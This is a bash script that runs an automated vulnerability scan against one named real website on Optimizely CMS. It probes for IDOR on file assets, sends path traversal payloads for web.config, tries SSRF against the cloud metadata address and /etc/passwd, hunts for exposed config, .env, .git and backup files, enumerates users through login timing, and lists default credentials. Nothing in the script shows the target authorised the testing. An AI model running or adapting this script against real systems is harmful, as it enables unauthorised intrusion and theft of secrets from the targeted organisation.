#!/bin/bash
# Optimizely CMS Vulnerability Testing for www.dnv.com
# Based on reconnaissance findings

TARGET="https://www.dnv.com"

echo "=========================================="
echo "  Optimizely CMS Vulnerability Testing"
echo "  Target: $TARGET"
echo "=========================================="

# 1. Content Assets IDOR Testing
echo -e "\n[1] TESTING CONTENTASSETS IDOR (File Access)"
echo "==========================================="

echo "Content assets use GUID format: /contentassets/{GUID}/filename"
echo ""

# Extract actual GUIDs from the homepage
echo "Extracting GUIDs from homepage..."
GUIDS=$(curl -s "$TARGET/" | grep -o 'contentassets/[a-f0-9-]\{36\}' | cut -d/ -f2 | sort -u)

echo "Found GUIDs:"
echo "$GUIDS" | head -10

echo -e "\nTesting if we can enumerate files in these directories..."
for guid in $(echo "$GUIDS" | head -5); do
    echo "  Testing GUID: $guid"

    # Try common file names
    FILES=("document.pdf" "file.pdf" "report.pdf" "data.xlsx" "confidential.pdf" "internal.docx")

    for file in "${FILES[@]}"; do
        HTTP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/contentassets/$guid/$file")
        if [ "$HTTP" == "200" ]; then
            echo "    🔥 FOUND: $file (HTTP 200)"
        fi
    done

    # Try directory listing
    HTTP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/contentassets/$guid/")
    echo "    Directory listing: HTTP $HTTP"
done

# 2. SiteAssets IDOR Testing
echo -e "\n[2] TESTING SITEASSETS ACCESS"
echo "==========================================="

# Test if we can access siteassets directly without parameters
echo "Testing direct access to siteassets..."
curl -s "$TARGET/siteassets/images/group/homepage/inspection-scale.jpg" -o /tmp/test_image.jpg
if [ -f /tmp/test_image.jpg ]; then
    SIZE=$(stat --format=%s /tmp/test_image.jpg 2>/dev/null || stat -f%z /tmp/test_image.jpg 2>/dev/null)
    echo "  ✓ Downloaded file, size: $SIZE bytes"
    file /tmp/test_image.jpg
fi

# Try path traversal in siteassets
echo -e "\nTesting path traversal in siteassets..."
TRAVERSAL_PAYLOADS=(
    "../../web.config"
    "../../../web.config"
    "....//....//web.config"
    "%2e%2e%2f%2e%2e%2fweb.config"
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    echo "  Payload: $payload"
    RESPONSE=$(curl -s "$TARGET/siteassets/$payload")
    if echo "$RESPONSE" | grep -q "connectionString\|appSettings"; then
        echo "    🔥 POTENTIAL PATH TRAVERSAL!"
    fi
done

# 3. Image Processing Parameter Manipulation
echo -e "\n[3] TESTING IMAGE PROCESSING SSRF/LFI"
echo "==========================================="

echo "Testing if image processing accepts external URLs (SSRF)..."
SSRF_URLS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://localhost:80"
    "file:///etc/passwd"
)

for url in "${SSRF_URLS[@]}"; do
    echo "  Testing: $url"
    RESPONSE=$(curl -s "$TARGET/siteassets/test.jpg?url=$url&mode=crop&width=100")
    if echo "$RESPONSE" | grep -i "root:\|ami-\|metadata"; then
        echo "    🔥 POTENTIAL SSRF!"
    fi
done

# Test path traversal via image path
echo -e "\nTesting path traversal in image paths..."
curl -s "$TARGET/siteassets/../../../../web.config?mode=crop" | head -20

# 4. API Endpoint Discovery
echo -e "\n[4] TESTING API ENDPOINTS"
echo "==========================================="

API_PATHS=(
    "/api"
    "/api/content"
    "/api/v1"
    "/api/v2"
    "/ContentDeliveryApi"
    "/contentdeliveryapi/api/v2"
    "/epi/api"
)

for api in "${API_PATHS[@]}"; do
    RESPONSE=$(curl -s "$TARGET$api" -w "\n__HTTP__:%{http_code}")
    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)

    if [ "$HTTP" != "404" ]; then
        echo "  ✓ $api → HTTP $HTTP"

        # Check if it returns JSON with data
        if echo "$RESPONSE" | grep -q '{"'; then
            echo "    Returns JSON:"
            echo "$RESPONSE" | head -10
        fi
    fi
done

# 5. User Enumeration via Timing
echo -e "\n[5] USER ENUMERATION (Login Page)"
echo "==========================================="

LOGIN_URL="$TARGET/util/login"

echo "Extracting login form fields..."
LOGIN_PAGE=$(curl -s "$LOGIN_URL")

# Check form fields
echo "$LOGIN_PAGE" | grep -o 'name="[^"]*"' | head -10

echo -e "\nTesting timing-based user enumeration..."
USERS=("admin" "administrator" "episerver" "optimizely" "nonexistent_xyz_123456")

for user in "${USERS[@]}"; do
    START=$(date +%s%N)
    curl -s -X POST "$LOGIN_URL" \
        -d "username=${user}&password=wrongpass" \
        -o /dev/null
    END=$(date +%s%N)
    TIME=$(((END - START) / 1000000))
    echo "  User '$user': ${TIME}ms"
done

# 6. Configuration File Access
echo -e "\n[6] TESTING CONFIGURATION FILE ACCESS"
echo "==========================================="

CONFIG_FILES=(
    "/web.config"
    "/Web.config"
    "/web.config.bak"
    "/episerver.config"
    "/appsettings.json"
    "/appsettings.production.json"
)

for file in "${CONFIG_FILES[@]}"; do
    echo "Testing: $file"
    RESPONSE=$(curl -s "$TARGET$file" -w "\n__HTTP__:%{http_code}")
    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)

    echo "  HTTP: $HTTP"

    if [ "$HTTP" == "200" ] && echo "$RESPONSE" | grep -q "connection\|password\|key"; then
        echo "  🔥 POTENTIAL CONFIG EXPOSURE!"
        echo "$RESPONSE" | grep -i "connection\|password" | head -5
    fi
done

# 7. Error-Based Information Disclosure
echo -e "\n[7] ERROR-BASED INFORMATION DISCLOSURE"
echo "==========================================="

echo "Triggering errors to gather version info..."
ERROR_URLS=(
    "$TARGET/nonexistent.aspx"
    "$TARGET/error%27%22.aspx"
    "$TARGET/test.aspx?error=true"
)

for url in "${ERROR_URLS[@]}"; do
    echo "Testing: $url"
    RESPONSE=$(curl -s "$url")

    # Check for version disclosure in errors
    if echo "$RESPONSE" | grep -i "episerver\|optimizely\|version\|\.dll"; then
        echo "  ⚠️ Version info in error:"
        echo "$RESPONSE" | grep -i "episerver\|optimizely\|version" | head -5
    fi

    # Check for stack traces
    if echo "$RESPONSE" | grep -q "StackTrace\|at System\|at Episerver"; then
        echo "  ⚠️ Stack trace exposed!"
    fi
done

# 8. Backup File Discovery
echo -e "\n[8] TESTING FOR BACKUP FILES"
echo "==========================================="

BACKUP_FILES=(
    "/backup.zip"
    "/site-backup.zip"
    "/wwwroot.zip"
    "/web.config.bak"
    "/web.config.old"
    "/database.bak"
    "/.git/config"
    "/.env"
    "/.env.production"
)

for file in "${BACKUP_FILES[@]}"; do
    HTTP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$file")
    if [ "$HTTP" == "200" ]; then
        echo "  🔥 FOUND: $file (HTTP 200)"
        SIZE=$(curl -s -o /dev/null -w "%{size_download}" "$TARGET$file")
        echo "    Size: $SIZE bytes"
    fi
done

# 9. GraphQL/OData Endpoints
echo -e "\n[9] TESTING GRAPHQL/ODATA"
echo "==========================================="

echo "Testing for GraphQL..."
curl -s -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name}}}"}' \
    -w "\nHTTP: %{http_code}\n" | head -30

echo -e "\nTesting for OData..."
ODATA_PATHS=(
    "/odata"
    "/api/odata"
    "/$odata"
)

for path in "${ODATA_PATHS[@]}"; do
    HTTP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path")
    if [ "$HTTP" != "404" ]; then
        echo "  ✓ $path → HTTP $HTTP"
        curl -s "$TARGET$path" | head -20
    fi
done

# 10. Default Credentials Test
echo -e "\n[10] TESTING DEFAULT CREDENTIALS"
echo "==========================================="

echo "Common Optimizely default credentials:"
echo "  - admin:store (old EPiServer)"
echo "  - administrator:password"
echo ""

echo "⚠️ Manual testing required - use Burp Suite for proper credential testing"

echo -e "\n=========================================="
echo "  TESTING COMPLETE"
echo "=========================================="
echo ""
echo "KEY FINDINGS TO LOOK FOR:"
echo "  🔥 Content assets IDOR"
echo "  🔥 Path traversal in file access"
echo "  🔥 SSRF via image processing"
echo "  🔥 API endpoints exposing data"
echo "  🔥 Configuration file exposure"
echo "  🔥 User enumeration"
echo "  🔥 Backup files"
